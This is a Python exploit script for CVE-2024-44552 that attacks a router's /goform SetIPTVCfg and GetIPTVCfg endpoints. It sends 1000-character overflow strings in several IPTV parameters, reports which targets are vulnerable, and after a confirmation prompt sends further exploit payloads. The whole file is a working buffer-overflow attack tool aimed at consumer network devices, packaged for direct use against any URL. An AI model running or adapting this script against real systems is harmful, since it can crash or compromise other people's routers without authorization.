import requests
import sys
import time

def print_banner():
    """Print the banner."""
    banner = """
    ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██╗  ██╗██╗  ██╗███████╗███████╗██████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ██║  ██║██║  ██║██╔════╝██╔════╝╚════██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗███████║███████║███████╗███████╗ █████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚════██║╚════██║╚════██║╚════██║██╔═══╝ 
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║           ██║     ██║███████║███████║███████╗
     ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝           ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝
    """
    print(banner)

def print_usage():
    """Print usage instructions for the user."""
    usage = """
    \033[93m[USAGE]\033[0m
    python3 cve-2024-44552.py <url>

    \033[94m<url>\033[0m should be in one of the following formats:
    - https://<ip/domain>:<port>
    - http://<ip/domain>:<port>

    Example:
    python3 cve-2024-44552.py http://192.168.1.1:80
    """
    print(usage)

def test_vulnerability(name, url, data, get_url):
    """Send POST requests to test buffer overflow vulnerability."""
    try:
        print(f"\033[94m[INFO]\033[0m Testing {name}...")
        response = requests.post(url, data=data)
        print("\033[96m[DEBUG]\033[0m POST request sent.")
        
        response = requests.post(get_url)
        print("\033[96m[DEBUG]\033[0m GET request sent.")
        
        if response.status_code == 200:
            print(f"\033[91m[ALERT] {name} is VULNERABLE!\033[0m")
        else:
            print(f"\033[94m[INFO] {name} does not seem vulnerable.\033[0m")
        
        print(f"\033[95m[DETAIL] Response:\n{response.text}\n\033[0m")
        return response.status_code == 200
    
    except Exception as e:
        print(f"\033[91m[ERROR] Failed to test {name}: {e}\033[0m")
        return False

def exploit_vulnerability(name, url, exploit_data, get_url):
    """Exploit the identified vulnerability."""
    try:
        print(f"\033[94m[INFO]\033[0m Exploiting {name}...")
        response = requests.post(url, data=exploit_data)
        print("\033[96m[DEBUG]\033[0m Exploit POST request sent.")
        
        response = requests.post(get_url, data={"bindLan": "aaaa"})
        print("\033[96m[DEBUG]\033[0m Exploit GET request sent.")
        
        print(f"\033[95m[DETAIL] Exploit Response:\n{response.text}\n\033[0m")
    
    except Exception as e:
        print(f"\033[91m[ERROR] Failed to exploit {name}: {e}\033[0m")

def main():
    print_banner()
    
    if len(sys.argv) != 2:
        print_usage()
        sys.exit(1)
    
    url = sys.argv[1]
    
    if not (url.startswith("http://") or url.startswith("https://")) or ":" not in url:
        print("\033[91m[ERROR] Invalid URL format. Please follow the usage instructions below.\033[0m")
        print_usage()
        sys.exit(1)
    
    base_url = f"{url}/goform"

    vulnerabilities = [
        {
            "name": "iptv.stb.port",
            "set_url": f"{base_url}/SetIPTVCfg",
            "data": {"bindLan": "a" * 1000},
            "get_url": f"{base_url}/GetIPTVCfg",
            "exploit_data": {"vlanId": "a" * 1000, "iptvType": "aaaa"}
        },
        {
            "name": "iptv.stb.mode",
            "set_url": f"{base_url}/SetIPTVCfg",
            "data": {"delVlanTag": "a" * 1000},
            "get_url": f"{base_url}/GetIPTVCfg",
            "exploit_data": {"vlanId": "a" * 1000, "iptvType": "aaaa"}
        },
        {
            "name": "iptv.city.vlan",
            "set_url": f"{base_url}/SetIPTVCfg",
            "data": {"iptvType": "a" * 1000},
            "get_url": f"{base_url}/GetIPTVCfg",
            "exploit_data": {"vlanId": "a" * 1000, "iptvType": "aaaa"}
        },
        {
            "name": "adv.iptv.stballvlans",
            "set_url": f"{base_url}/SetIPTVCfg",
            "data": {"list": "a" * 1000, "iptvType": "aaaa"},
            "get_url": f"{base_url}/GetIPTVCfg",
            "exploit_data": {"vlanId": "a" * 1000, "iptvType": "aaaa"}
        },
        {
            "name": "adv.iptv.stbpvid",
            "set_url": f"{base_url}/SetIPTVCfg",
            "data": {"vlanId": "a" * 1000, "iptvType": "aaaa"},
            "get_url": f"{base_url}/GetIPTVCfg",
            "exploit_data": {"vlanId": "a" * 1000, "iptvType": "aaaa"}
        }
    ]
    
    start_time = time.time()
    
    for vuln in vulnerabilities:
        is_vulnerable = test_vulnerability(vuln["name"], vuln["set_url"], vuln["data"], vuln["get_url"])
        if is_vulnerable:
            user_input = input(f"\033[93m[PROMPT]\033[0m {vuln['name']} is vulnerable. Would you like to attempt an exploit? (yes/no): ").strip().lower()
            if user_input == "yes":
                exploit_vulnerability(vuln["name"], vuln["set_url"], vuln["exploit_data"], vuln["get_url"])
    
    end_time = time.time()
    print(f"\n\033[94m[INFO] Scan completed in {end_time - start_time:.2f} seconds.\033[0m")

if __name__ == "__main__":
    main()
